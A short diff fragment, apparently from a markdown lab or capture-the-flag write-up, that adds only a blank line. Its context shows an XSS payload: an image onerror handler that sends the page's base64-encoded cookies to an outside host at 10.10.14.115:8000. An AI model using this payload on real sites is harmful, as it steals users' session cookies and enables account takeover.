@@ -100,3 +100,4 @@ console.log(encoded)
 ```js
 <img src=x onerror=this.src='[http://10.10.14.115:8000/'+btoa(document.cookie)>
 ```
+
